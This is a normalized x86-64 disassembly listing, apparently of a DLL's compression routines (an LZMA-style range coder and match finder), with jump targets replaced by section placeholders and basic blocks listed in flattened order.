lea r13 [ rbx + r11 * 4 + 0x348e0 ]
and ecx 0xc
add ecx 0x6
shr rax cl
movzx eax [ rax + rbx + 0x3076c ]
lea r9d [ rax + rcx * 2 ]
movsxd rax r12d
mov [ rbp - 0x78 ] rax
mov rax [ rbp - 0x68 ]
mov [ rsp + 0x48 ] r9d
add rax rdi
lea rcx [ rax + rax * 2 ]
add rcx rcx
lea r12 [ rbx + rcx * 8 + 0x788 ]
nop [ rax ] eax
add rcx 0x30
dec rax
mov [ rcx ] 0x40000000
jne r-xdata
mov eax [ r8 ]
lea edx [ r9 + rax ]
cmp edx [ rcx - 0x1c ]
jae r-xdata
mov r14d [ rsp + 0x48 ]
test r13d r13d
jne r-xdata
cmp esi 0x80
jae r-xdata
mov edx 0x3
add rax 0x2
add edx 0x2
cmp edi [ r8 + rax * 4 ]
ja r-xdata
mov [ rsp + 0x2c ] edx
mov eax [ rbx + 0x33200 ]
mov rdi [ rsp + 0x58 ]
lea r9d [ r12 + 0x1 ]
lea edx [ r9 + rax ]
mov eax [ rsp + 0x4c ]
cmp edx eax
cmova edx eax
cmp r9d edx
jae r-xdata
lea eax [ r12 + 0x1 ]
mov [ rsp + 0x34 ] eax
shl rdx 0x6
mov eax r9d
mov ecx esi
add rdx rax
and ecx 0xf
mov eax [ rbx + rdx * 4 + 0x3321c ]
add eax [ rbx + rcx * 4 + 0x33e1c ]
add r14d eax
shl rdx 0x7
mov eax esi
add rdx rax
add r14d [ rbx + rdx * 4 + 0x3361c ]
jmp r-xdata
or eax 0xffffffff
sub eax r12d
add r9d eax
mov [ rsp + 0x60 ] r9d
cmp r9d 0x2
jb r-xdata
mov r8 rsi
lea rcx [ r15 + rdi + 0x1 ]
sub r8 rdi
nop [ rax ] eax
cmp edi [ r8 ]
jne r-xdata
mov eax [ rsp + 0x24 ]
mov [ r12 - 0x1c ] r14d
mov [ r12 - 0x14 ] 0x0
mov [ r12 - 0x4 ] eax
lea eax [ rsi + 0x4 ]
mov [ r12 ] eax
cmp r14d [ r12 - 0x1c ]
jae r-xdata
mov r11d [ rsp + 0x24 ]
mov r10d [ rsp + 0x30 ]
mov r9d [ rsp + 0x28 ]
movzx r11d [ r15 + rdi ]
mov r10d [ rsp + 0x38 ]
movzx r13d [ r15 + rdi - 0x1 ]
mov edi [ rbx + 0x33e64 ]
movzx esi [ r15 + rsi ]
mov r14 [ rbx + 0x33e78 ]
add r10d r12d
mov r12d 0x100
mov ecx edi
mov eax r10d
and r10d [ rbx + 0x33e70 ]
xor r9d r9d
and eax [ rbx + 0x33e74 ]
or r11d r12d
shl r10d cl
mov [ rbp - 0x80 ] eax
nop [ rax + rax ] ax
inc r9d
inc rcx
cmp r9d edx
jb r-xdata
inc edi
inc r15
add r13 0x4
mov [ rsp + 0x34 ] edi
mov [ rsp + 0x78 ] r15
add r12 0x30
jmp r-xdata
mov eax [ rbx + 0x33200 ]
mov r11 [ rsp + 0x58 ]
lea ecx [ rsi + 0x1 ]
sub r11 rcx
inc edi
lea r10 [ r15 + 0x1 ]
lea edx [ rdi + rax ]
mov eax [ rsp + 0x4c ]
mov r9d edi
cmp edx eax
cmova edx eax
cmp edi edx
jae r-xdata
mov ecx 0x8
add esi esi
mov eax r12d
sub cl dil
and eax esi
mov edx r13d
shr edx cl
add eax r12d
mov ecx r11d
shr ecx 0x8
add edx r10d
add eax ecx
mov ecx r11d
lea edx [ rdx + rdx * 2 ]
shr ecx 0x7
shl edx 0x8
add r11d r11d
add rdx rax
and ecx 0x1
mov eax r11d
movzx r8d [ r14 + rdx * 2 ]
neg ecx
xor eax esi
sar rcx 0x4
shr r8 0x4
not eax
and ecx 0x7f
and r12d eax
xor r8 rcx
add r9d [ rbx + r8 * 4 + 0x3276c ]
cmp r11d 0x10000
jb r-xdata
mov rax [ rbp - 0x50 ]
mov r12d [ rsp + 0x64 ]
mov r13d [ rsp + 0x24 ]
lea r10 [ __dos_header ]
mov edx [ r10 + rax * 4 + 0x24148 ]
mov eax [ rbp - 0x80 ]
mov r11d [ r10 + rdx * 4 + 0x240e8 ]
lea rcx [ rdx + 0x19f4 ]
shl rcx 0x4
add rcx rax
mov rax [ rbp - 0x38 ]
movzx ecx [ rbx + rcx * 2 ]
add rax r15
shr rcx 0x4
mov r8d [ rbx + rcx * 4 + 0x3276c ]
add r8d [ rbx + rax * 4 + 0x39128 ]
mov eax [ rsp + 0x38 ]
lea edi [ rax + r12 + 0x1 ]
add r8d r9d
mov r9d [ rsp + 0x60 ]
and edi [ rbx + 0x33e74 ]
add r8d [ rbp - 0x70 ]
lea rax [ r11 + 0x19f4 ]
shl rax 0x4
add rax rdi
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + r11 * 2 + 0x34000 ]
xor rax 0x7f0
xor rcx 0x7f0
shr rax 0x4
shr rcx 0x4
mov esi [ rbx + rcx * 4 + 0x3276c ]
add esi [ rbx + rax * 4 + 0x3276c ]
lea eax [ r9 + r12 ]
lea r10d [ rax + r13 + 0x1 ]
mov r13d [ rsp + 0x20 ]
add esi r8d
cmp r13d r10d
jae r-xdata
movzx eax [ rcx + r8 ]
cmp [ rcx ] al
jne r-xdata
mov eax [ r13 ]
mov [ rbp - 0x80 ] r12
mov [ rbp - 0x70 ] r13
lea rdx [ r15 - 0x2 ]
lea r14d [ r10 + rax ]
cmp edi 0x5
jb r-xdata
or eax 0xffffffff
sub eax [ rsp + 0x34 ]
add r9d eax
or rax 0xffffffffffffffff
sub rax r15
mov [ rsp + 0x70 ] r9d
add r10 rax
mov [ rbp - 0x38 ] r10
cmp r9d 0x2
jb r-xdata
mov r8 [ rsp + 0x58 ]
lea rcx [ r15 + r11 + 0x1 ]
sub r8 r11
mov r13d [ rsp + 0x3c ]
mov r14d [ rsp + 0x48 ]
mov rax rdi
imul rax rax 0x110
lea edx [ r9 - 0x2 ]
mov r9d [ rsp + 0x28 ]
add rdx rax
lea rax [ r11 + 0x1a03 ]
mov r8d [ rbx + rdx * 4 + 0x39130 ]
shl rax 0x4
add rax rdi
mov rdi [ rsp + 0x58 ]
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + r11 * 2 + 0x34018 ]
mov r11d [ rsp + 0x24 ]
xor rcx 0x7f0
shr rax 0x4
shr rcx 0x4
add r8d [ rbx + rcx * 4 + 0x3276c ]
lea rcx [ r10 + r10 * 2 ]
mov r10d [ rsp + 0x30 ]
add r8d [ rbx + rax * 4 + 0x3276c ]
add rcx rcx
add r8d esi
cmp r8d [ rbx + rcx * 8 + 0x76c ]
jae r-xdata
mov r8 [ rsp + 0x50 ]
lea rax [ r8 + r8 * 2 ]
add rax rax
lea rcx [ rbx + rax * 8 + 0x76c ]
mov eax r10d
sub eax r13d
add r13d eax
mov edx eax
add r8 rdx
mov [ rsp + 0x20 ] r13d
mov [ rsp + 0x50 ] r8
nop [ rax + rax ] ax
mov edi [ rsp + 0x34 ]
mov r11d [ rsp + 0x24 ]
movzx r12d [ r15 + r11 ]
mov eax [ rsp + 0x38 ]
mov rsi [ rbx + 0x33e78 ]
dec eax
mov r13d 0x100
xor r10d r10d
add eax edi
mov edi [ rbx + 0x33e70 ]
mov ecx eax
and edi eax
and ecx [ rbx + 0x33e74 ]
mov [ rsp + 0x60 ] ecx
mov rcx [ rsp + 0x58 ]
movzx r11d [ r15 + rcx ]
movzx r9d [ r15 + rcx - 0x1 ]
mov r15d [ rbx + 0x33e64 ]
mov ecx r15d
or r11d r13d
shl edi cl
nop [ rax + rax ] ax
mov r8 [ rsp + 0x50 ]
inc r9d
inc r10
inc rcx
cmp r9d edx
jb r-xdata
mov r8 [ rsp + 0x50 ]
mov r12d [ rsp + 0x20 ]
lea eax [ r12 + r11 + 0x1 ]
mov [ rbx + rcx * 8 + 0x76c ] r8d
mov [ rbx + rcx * 8 + 0x788 ] 0x0
mov [ rbx + rcx * 8 + 0x774 ] 0x1
mov [ rbx + rcx * 8 + 0x778 ] 0x1
mov [ rbx + rcx * 8 + 0x77c ] r11d
mov [ rbx + rcx * 8 + 0x784 ] eax
mov [ rbx + rcx * 8 + 0x780 ] r13d
jmp r-xdata
add rcx 0x30
dec rdx
mov [ rcx ] 0x40000000
jne r-xdata
mov esi [ r8 + 0x4 ]
mov r10d [ rsp + 0x28 ]
mov [ rsp + 0x3c ] esi
cmp esi 0x80
jb r-xdata
mov ecx 0x8
add r12d r12d
mov eax r13d
sub cl r15b
and eax r12d
mov edx r9d
shr edx cl
add eax r13d
mov ecx r11d
shr ecx 0x8
add edx edi
add eax ecx
mov ecx r11d
lea edx [ rdx + rdx * 2 ]
shr ecx 0x7
shl edx 0x8
add r11d r11d
add rdx rax
and ecx 0x1
mov eax r11d
movzx r8d [ rsi + rdx * 2 ]
neg ecx
xor eax r12d
sar rcx 0x4
shr r8 0x4
not eax
and ecx 0x7f
and r13d eax
xor r8 rcx
add r10d [ rbx + r8 * 4 + 0x3276c ]
cmp r11d 0x10000
jb r-xdata
mov r11d [ rsp + 0x60 ]
mov rax [ rbp - 0x50 ]
mov r13d [ rsp + 0x24 ]
mov esi [ rsp + 0x3c ]
lea rdi [ __dos_header ]
mov [ rsp + 0x64 ] r10d
mov edx [ rdi + rax * 4 + 0x24118 ]
mov r10 [ rbp - 0x38 ]
mov edi [ rdi + rdx * 4 + 0x240e8 ]
lea rcx [ rdx + 0x19f4 ]
shl rcx 0x4
add rcx r11
inc r11d
movzx eax [ rbx + rcx * 2 ]
and r11d [ rbx + 0x33e74 ]
shr rax 0x4
mov r8d [ rbx + rax * 4 + 0x3276c ]
lea rax [ rdi + 0x19f4 ]
add r8d [ rsp + 0x64 ]
shl rax 0x4
add rax r11
add r8d r14d
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + rdi * 2 + 0x34000 ]
xor rax 0x7f0
xor rcx 0x7f0
shr rax 0x4
shr rcx 0x4
mov r12d [ rbx + rcx * 4 + 0x3276c ]
add r12d [ rbx + rax * 4 + 0x3276c ]
mov eax [ rsp + 0x34 ]
add eax [ rsp + 0x70 ]
add r12d r8d
lea r8d [ rax + r13 + 0x1 ]
mov r13d [ rsp + 0x20 ]
cmp r13d r8d
jae r-xdata
movzx eax [ rcx ]
cmp [ r8 + rcx ] al
jne r-xdata
mov r9d [ rsp + 0x48 ]
mov ecx 0x7ffff
mov eax esi
sub ecx esi
shr ecx 0x1f
neg ecx
and ecx 0xc
add ecx 0x6
shr rax cl
movzx eax [ rax + rbx + 0x3076c ]
lea r9d [ rax + rcx * 2 ]
mov [ rsp + 0x48 ] r9d
jmp r-xdata
mov r15 [ rsp + 0x78 ]
mov r13 [ rbp - 0x70 ]
lea rax [ rdi + 0x1a03 ]
shl rax 0x4
add rax r11
imul r11 r11 0x110
movzx ecx [ rbx + rax * 2 ]
movzx eax [ rbx + rdi * 2 + 0x34018 ]
mov edi [ rsp + 0x34 ]
xor rcx 0x7f0
add r11 r10
shr rax 0x4
shr rcx 0x4
mov edx [ rbx + rcx * 4 + 0x3276c ]
lea rcx [ r8 + r8 * 2 ]
mov r8 [ rsp + 0x50 ]
add edx [ rbx + rax * 4 + 0x3276c ]
add rcx rcx
add edx [ rbx + r11 * 4 + 0x39128 ]
mov r11d [ rsp + 0x24 ]
add edx r12d
mov r12 [ rbp - 0x80 ]
cmp edx [ rbx + rcx * 8 + 0x76c ]
jae r-xdata
mov r9 [ rbp - 0x78 ]
lea rax [ r9 + r9 * 2 ]
add rax rax
lea rcx [ rbx + rax * 8 + 0x76c ]
mov eax r8d
sub eax r13d
add r13d eax
mov edx eax
add r9 rdx
mov [ rsp + 0x20 ] r13d
mov [ rbp - 0x78 ] r9
nop [ rax ] eax
mov edx [ rsp + 0x2c ]
add r8 0x8
add edx 0x2
mov [ rsp + 0x50 ] r8
mov [ rsp + 0x2c ] edx
cmp edx [ rsp + 0x44 ]
je r-xdata
lea eax [ rdi + r11 + 0x1 ]
mov [ rbx + rcx * 8 + 0x76c ] edx
mov [ rbx + rcx * 8 + 0x788 ] 0x0
mov [ rbx + rcx * 8 + 0x784 ] eax
lea eax [ rsi + 0x4 ]
mov [ rbx + rcx * 8 + 0x774 ] 0x1
mov [ rbx + rcx * 8 + 0x778 ] 0x1
mov [ rbx + rcx * 8 + 0x77c ] r11d
mov [ rbx + rcx * 8 + 0x780 ] eax
jmp r-xdata
add rcx 0x30
dec rdx
mov [ rcx ] 0x40000000
jne r-xdata
sub_180003d30
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r15
sub rsp 0x30
cmp [ rcx + 0x33204 ] 0x0
mov r15 rdx
mov rdi rcx
jne r-xdata
mov r12d [ rcx + 0x760 ]
mov esi [ rcx + 0x764 ]
lea rdx [ rsp + 0x60 ]
call sub_1800022d0
mov esi [ rsp + 0x60 ]
mov r12d eax
jmp r-xdata
mov rcx [ rdi + 0x30 ]
mov eax 0x111
mov [ rsp + 0x78 ] rbx
cmp ebp eax
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x20 ] r14
cmova ebp eax
call [ rdi + 0x18 ]
movzx r10d [ rax - 0x1 ]
xor r13d r13d
lea r11 [ rax - 0x1 ]
lea r9 [ rdi + 0x33208 ]
mov [ rsp + 0x70 ] r13d
mov [ rsp + 0x60 ] r13d
mov r14d r13d
mov r8d r13d
nop [ rax + rax ] ax
mov eax 0x1
add rsp 0x30
pop r15
pop r12
pop rdi
pop rsi
pop rbp
retn
mov ebp [ rdi + 0x768 ]
mov [ r15 ] 0xffffffff
cmp ebp 0x2
jae r-xdata
mov edx [ rsp + 0x60 ]
movzx eax [ rdx + 0x1 ]
cmp [ r11 + 0x1 ] al
jne r-xdata
mov eax [ r9 ]
mov rdx r11
inc eax
sub rdx rax
cmp r10b [ rdx ]
jne r-xdata
cmp r12d [ rdi + 0x33200 ]
jb r-xdata
mov ebx 0x2
cmp ebp ebx
jbe r-xdata
mov r15d 0x1
cmp r12d 0x2
jb r-xdata
lea eax [ rsi - 0x1 ]
lea edx [ r12 - 0x1 ]
mov eax [ rdi + rax * 4 + 0x3296c ]
add eax 0x4
mov [ r15 ] eax
jmp r-xdata
cmp ebx [ rdi + 0x33200 ]
jae r-xdata
lea rcx [ r11 + 0x2 ]
sub rdx r11
nop [ rax + rax ] ax
cmp r14d 0x2
jb r-xdata
lea eax [ rsi - 0x1 ]
mov r13d [ rdi + rax * 4 + 0x3296c ]
cmp esi 0x2
jbe r-xdata
test edx edx
je r-xdata
lea edx [ rbx - 0x1 ]
mov [ r15 ] r8d
test edx edx
je r-xdata
cmp ebx r14d
jbe r-xdata
inc ebx
inc rcx
cmp ebx ebp
jb r-xdata
cmp r12d 0x2
jb r-xdata
lea eax [ r14 + 0x1 ]
cmp eax r12d
jae r-xdata
cmp r12d 0x2
jne r-xdata
nop [ rax + rax ] eax
mov eax r12d
jmp r-xdata
mov rcx [ rdi + 0x30 ]
add [ rdi + 0x33204 ] edx
call [ rdi + 0x28 ]
mov eax ebx
jmp r-xdata
mov rcx [ rdi + 0x30 ]
add [ rdi + 0x33204 ] edx
call [ rdi + 0x28 ]
mov edx r8d
mov r14d ebx
mov [ rsp + 0x60 ] edx
jmp r-xdata
movzx eax [ rdx + rcx ]
cmp [ rcx ] al
jne r-xdata
mov eax r15d
cmp ebp 0x2
jbe r-xdata
mov rcx [ rsp + 0x68 ]
mov [ rcx ] edx
lea edx [ r14 - 0x1 ]
test edx edx
je r-xdata
lea eax [ r14 + 0x2 ]
cmp eax r12d
jb r-xdata
cmp r13d 0x80
cmovae r12d r15d
lea ecx [ rsi - 0x3 ]
mov eax r13d
shr eax 0x7
cmp eax [ rdi + rcx * 4 + 0x3296c ]
jbe r-xdata
mov r13 [ rsp + 0x28 ]
mov rbx [ rsp + 0x78 ]
mov r14 [ rsp + 0x20 ]
add rsp 0x30
pop r15
pop r12
pop rdi
pop rsi
pop rbp
retn
inc r8d
add r9 0x4
cmp r8d 0x4
jb r-xdata
lea rdx [ rdi + 0x764 ]
mov rcx rdi
call sub_1800022d0
mov r11d eax
mov [ rdi + 0x760 ] eax
cmp eax 0x2
jb r-xdata
mov eax r14d
jmp r-xdata
mov rcx [ rdi + 0x30 ]
add [ rdi + 0x33204 ] edx
call [ rdi + 0x28 ]
lea eax [ r14 + 0x3 ]
cmp eax r12d
jb r-xdata
cmp r13d 0x200
jae r-xdata
add esi 0xfffffffe
lea eax [ rsi - 0x2 ]
mov r12d [ rdi + rax * 4 + 0x3296c ]
lea eax [ rsi - 0x1 ]
mov r13d [ rdi + rax * 4 + 0x3296c ]
cmp esi 0x2
ja r-xdata
mov rcx [ rdi + 0x30 ]
call [ rdi + 0x18 ]
movzx r10d [ rax - 0x1 ]
lea rbx [ rdi + 0x33208 ]
lea r11 [ rax - 0x1 ]
xor eax eax
mov ecx [ rdi + 0x764 ]
dec ecx
mov edx [ rdi + rcx * 4 + 0x3296c ]
cmp eax r12d
jb r-xdata
cmp r13d 0x8000
jb r-xdata
lea eax [ rsi - 0x4 ]
mov eax [ rdi + rax * 4 + 0x3296c ]
inc eax
cmp r12d eax
jne r-xdata
inc eax
add rbx 0x4
mov [ rsp + 0x70 ] eax
cmp eax 0x4
jb r-xdata
movzx eax [ r8 + 0x1 ]
cmp [ r11 + 0x1 ] al
jne r-xdata
lea ecx [ r12 + 0x1 ]
cmp eax ecx
jne r-xdata
cmp edx r13d
jb r-xdata
mov edx [ rbx ]
mov r8 r11
inc edx
sub r8 rdx
cmp r10b [ r8 ]
jne r-xdata
mov rcx [ rsp + 0x68 ]
lea eax [ r13 + 0x4 ]
lea edx [ r12 - 0x2 ]
mov [ rcx ] eax
mov eax [ rsp + 0x70 ]
lea r9d [ r12 - 0x1 ]
mov edx 0x2
cmp r9d edx
jbe r-xdata
cmp r11d ecx
ja r-xdata
mov eax edx
shr eax 0x7
cmp eax r13d
jbe r-xdata
lea rcx [ r11 + 0x2 ]
sub r8 r11
lea eax [ r11 + 0x1 ]
cmp eax r12d
jb r-xdata
cmp edx r9d
jae r-xdata
inc edx
inc rcx
cmp edx r9d
jb r-xdata
cmp r12d 0x3
jb r-xdata
movzx eax [ r8 + rcx ]
cmp [ rcx ] al
jne r-xdata
mov eax r13d
shr eax 0x7
cmp eax edx
ja r-xdata
sub_180004090
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
mov r10d [ rcx + 0x33218 ]
mov r8d [ rcx + 0x3d580 ]
mov r13d edx
add r10 0x19f4
mov r12d edx
mov edx r8d
shl r10 0x4
shr edx 0xb
mov rbp rcx
add r10 r13
movzx r9d [ rcx + r10 * 2 ]
imul edx r9d
mov eax edx
sub r8d edx
add [ rcx + 0x3d588 ] rax
mov eax r9d
mov [ rcx + 0x3d580 ] r8d
shr eax 0x5
sub r9w ax
mov [ rcx + r10 * 2 ] r9w
mov eax [ rcx + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov edx [ rbp + 0x33218 ]
mov eax [ rbp + 0x3d580 ]
movzx ecx [ rbp + rdx * 2 + 0x34000 ]
shr eax 0xb
imul eax ecx
mov [ rbp + 0x3d580 ] eax
mov eax 0x800
sub eax ecx
shr eax 0x5
add ax cx
mov [ rbp + rdx * 2 + 0x34000 ] ax
mov eax [ rbp + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
shl eax 0x8
add rcx 0x3d580
mov [ rcx ] eax
call sub_1800017d0
mov eax [ rbp + 0x33218 ]
lea rcx [ r--data ]
xor ebx ebx
mov eax [ rcx + rax * 4 ]
cmp [ rbp + 0x3d578 ] ebx
lea rdx [ rbp + 0x3d580 ]
sete bl
lea rcx [ rbp + 0x344e4 ]
mov r9d r13d
xor r8d r8d
mov [ rbp + 0x33218 ] eax
call sub_180001e30
test ebx ebx
je r-xdata
shl eax 0x8
lea rcx [ rbp + 0x3d580 ]
mov [ rbp + 0x3d580 ] eax
call sub_1800017d0
mov esi 0x1
mov r13d 0x6
mov ebx esi
nop [ rax + rax ] ax
lea rbx [ rbp + r13 * 4 + 0x38cec ]
dec [ rbx ]
jne r-xdata
mov eax edx
sub r8d edx
add [ rbp + 0x3d588 ] rax
mov eax ecx
mov [ rbp + 0x3d580 ] r8d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rbp + 0x3d580 ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
mov r8d [ rbp + 0x38ce8 ]
imul r12 r12 0x440
lea rax [ rbp + 0x3276c ]
lea rcx [ rbp + 0x344e4 ]
lea r9 [ r12 + rbp + 0x348e8 ]
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180002040
mov r11d [ rbp + 0x38ce8 ]
mov [ rbx ] r11d
add ebx ebx
or ebx r12d
test r13d r13d
jne r-xdata
shl eax 0x8
lea rcx [ rbp + 0x3d580 ]
mov [ rbp + 0x3d580 ] eax
call sub_1800017d0
mov [ rbp + r9 * 2 + 0x341e0 ] cx
mov eax [ rbp + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov r8d [ rbp + 0x3d580 ]
dec r13d
mov r12d 0x3f
mov ecx r13d
mov r9d ebx
mov edx r8d
shr r12d cl
movzx ecx [ rbp + r9 * 2 + 0x341e0 ]
shr edx 0xb
imul edx ecx
and r12d esi
jne r-xdata
lea r8d [ r13 + 0x1a ]
lea rcx [ rbp + 0x3d580 ]
mov edx 0x3ffffff
call sub_180001950
mov r12d 0xf
lea r13d [ r12 - 0xb ]
nop [ rax + rax ] ax
mov eax edx
sub r8d edx
add [ rbp + 0x3d588 ] rax
mov eax ecx
mov [ rbp + 0x3d580 ] r8d
shr eax 0x5
sub ecx eax
mov eax 0x800
mov [ rbp + 0x3d580 ] edx
sub eax ecx
shr eax 0x5
add ecx eax
jmp r-xdata
add esi esi
shr r12d 0x1
or esi ebx
dec r13
jne r-xdata
shl eax 0x8
lea rcx [ rbp + 0x3d580 ]
mov [ rbp + 0x3d580 ] eax
call sub_1800017d0
mov [ rbp + r9 * 2 + 0x344c4 ] cx
mov eax [ rbp + 0x3d580 ]
cmp eax 0x1000000
jae r-xdata
mov r8d [ rbp + 0x3d580 ]
mov r9d esi
mov ebx r12d
movzx ecx [ rbp + r9 * 2 + 0x344c4 ]
mov edx r8d
shr edx 0xb
imul edx ecx
and ebx 0x1
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
sub_180004380
mov eax [ rcx + 0x3d5e4 ]
test eax eax
jne r-xdata
retn
cmp [ rcx + 0x3d5c0 ] eax
mov edx 0x9
cmovne eax edx
cmp [ rcx + 0x2d0 ] 0x0
mov [ rcx + 0x3d5e4 ] eax
je r-xdata
mov eax [ rcx + 0x3d5e4 ]
test eax eax
je r-xdata
mov [ rcx + 0x3d5e4 ] 0x8
mov [ rcx + 0x3d5dc ] 0x1
sub_1800043d0
mov [ rsp + 0x18 ] rbx
push rbp
sub rsp 0x20
cmp [ rcx + 0x3d5c8 ] 0x0
mov [ rsp + 0x38 ] rdi
mov eax edx
mov rbx rcx
mov [ rcx + 0x3d5dc ] 0x1
je r-xdata
lea rcx [ rbx + 0x3d580 ]
call sub_180001880
cmp [ rbx + 0x3d5c0 ] 0x0
mov ebp 0x9
jne r-xdata
mov edx [ rcx + 0x33e74 ]
and edx eax
call sub_180004090
mov eax [ rbx + 0x3d5e4 ]
mov rdi [ rsp + 0x38 ]
test eax eax
jne r-xdata
mov rdx [ rbx + 0x3d5a8 ]
mov rax [ rbx + 0x3d5b0 ]
mov [ rsp + 0x30 ] rsi
mov rsi [ rbx + 0x3d598 ]
mov rcx rax
sub rsi rdx
mov r8 rsi
call [ rax ]
cmp rsi rax
je r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rbp
retn
cmp [ rbx + 0x3d5c0 ] eax
cmovne eax ebp
cmp [ rbx + 0x2d0 ] 0x0
mov [ rbx + 0x3d5e4 ] eax
je r-xdata
mov rax [ rbx + 0x3d5a8 ]
add [ rbx + 0x3d5b8 ] rsi
mov rsi [ rsp + 0x30 ]
mov [ rbx + 0x3d598 ] rax
mov [ rbx + 0x3d5c0 ] ebp
mov eax [ rbx + 0x3d5e4 ]
test eax eax
je r-xdata
mov [ rbx + 0x3d5e4 ] 0x8
mov [ rbx + 0x3d5dc ] 0x1
sub_1800044c0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov rsi rcx
xor r8d r8d
lea r9 [ rcx + 0x33e1c ]
nop [ rax ] eax
mov eax r11d
mov edx ebx
add r11d r11d
movzx ecx [ rsi + rax * 2 + 0x344c4 ]
and edx 0x1
shr ebx 0x1
mov eax edx
shr rcx 0x4
or r11d edx
neg eax
sar rax 0x4
and eax 0x7f
xor rcx rax
add r10d [ rsi + rcx * 4 + 0x3276c ]
dec edi
jne r-xdata
inc r8d
mov [ r9 ] r10d
add r9 0x4
cmp r8d 0x10
jb r-xdata
xor r10d r10d
mov ebx r8d
mov r11d 0x1
lea edi [ r10 + 0x4 ]
mov rbx [ rsp + 0x8 ]
mov [ rsi + 0x33e5c ] edi
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
sub_180004550
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x210
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x200 ] rax
mov r14d 0x4
mov r10 rcx
lea rbx [ rcx + 0x30770 ]
mov r8d r14d
lea r9 [ rsp + 0x10 ]
nop [ rax ] eax
inc r8d
mov [ r9 ] r11d
inc rbx
add r9 r14
cmp r8d 0x80
jb r-xdata
nop [ rax + rax ] eax
movzx edx [ rbx ]
xor r11d r11d
mov ebp r8d
mov esi edx
mov eax edx
lea edi [ r11 + 0x1 ]
and eax 0x1
shr esi 0x1
mov r12d edx
dec esi
or eax 0x2
mov ecx esi
shl eax cl
sub ebp eax
movsxd r13 eax
test esi esi
je r-xdata
lea rbp [ rsp ]
lea rdi [ r10 + 0x3321c ]
lea rsi [ r10 + 0x341e0 ]
sub rbp r10
lea r12 [ r10 + 0x33624 ]
sub rbp 0x3361c
mov eax edi
mov edx ebp
add edi edi
sub rax r12
and edx 0x1
shr ebp 0x1
add rax r13
or edi edx
movzx ecx [ r10 + rax * 2 + 0x343de ]
mov eax edx
neg eax
shr rcx 0x4
sar rax 0x4
and eax 0x7f
xor rcx rax
add r11d [ r10 + rcx * 4 + 0x3276c ]
dec esi
jne r-xdata
mov edx 0xe
cmp [ r10 + 0x33e60 ] edx
jbe r-xdata
mov rbx rdi
nop [ rax + rax ] ax
mov eax [ rdi ]
lea r8 [ r10 + 0x30770 ]
lea rdx [ r12 + 0x8 ]
mov [ r12 - 0x8 ] eax
mov eax [ rdi + 0x4 ]
mov r9d 0x7c
mov [ r12 - 0x4 ] eax
mov eax [ rdi + 0x8 ]
mov [ r12 ] eax
mov eax [ rdi + 0xc ]
mov [ r12 + 0x4 ] eax
nop [ rax ] eax
lea rcx [ rdi + 0x38 ]
nop [ rax + rax ] ax
mov [ rbx ] r9d
inc r11d
add rbx 0x4
cmp r11d [ r10 + 0x33e60 ]
jb r-xdata
mov ecx r8d
mov eax r8d
shr r8d 0x1
and ecx 0x1
shr rax 0x1
movzx edx [ rsi + rax * 2 ]
neg ecx
sar rcx 0x4
shr rdx 0x4
and ecx 0x7f
xor rdx rcx
add r9d [ r10 + rdx * 4 + 0x3276c ]
cmp r8d 0x1
jne r-xdata
movzx eax [ r8 ]
add rdx 0x4
inc r8
mov ecx [ rdi + rax * 4 ]
add ecx [ rdx + rbp - 0x4 ]
dec r9
mov [ rdx - 0x4 ] ecx
jne r-xdata
sub rsi 0xffffffffffffff80
add rdi 0x100
add r12 0x200
sub rbp 0x200
dec r14
jne r-xdata
mov eax edx
inc edx
add rcx 0x4
shr eax 0x1
sub eax 0x5
shl eax 0x4
add [ rcx - 0x4 ] eax
cmp edx [ r10 + 0x33e60 ]
jb r-xdata
mov r8d r11d
xor r9d r9d
or r8d 0x40
cmp r8d 0x1
je r-xdata
xor r11d r11d
cmp [ r10 + 0x33e60 ] r11d
jbe r-xdata
mov [ r10 + 0x3d5d8 ] r14d
mov rcx [ rsp + 0x200 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x210 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_1800047a0
mov [ rsp + 0x20 ] rbp
push r12
sub rsp 0x50
lea r9 [ rcx + 0x248 ]
xor r12d r12d
mov rbp rcx
mov [ rcx + 0x3d5b0 ] r12
mov [ rcx + 0x3d5a8 ] r12
mov rcx r9
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x70 ] rdi
call sub_180007750
mov [ rbp + 0x178 ] r12
mov [ rbp + 0x1c0 ] r12d
mov [ rbp + 0x200 ] r12
mov [ rbp + 0x1d0 ] r12
mov [ rbp + 0x1d8 ] r12
mov [ rbp + 0x1e0 ] r12
mov [ rbp + 0x1e8 ] r12
mov [ rbp + 0x1f0 ] r12
mov [ rbp + 0x1f8 ] r12
mov [ rbp + 0x80 ] r12d
mov [ rbp + 0xc0 ] r12
mov [ rbp + 0x90 ] r12
mov [ rbp + 0x98 ] r12
mov [ rbp + 0xa0 ] r12
mov [ rbp + 0xa8 ] r12
mov [ rbp + 0xb0 ] r12
mov [ rbp + 0xb8 ] r12
lea rdx [ rsp + 0x20 ]
mov rcx rbp
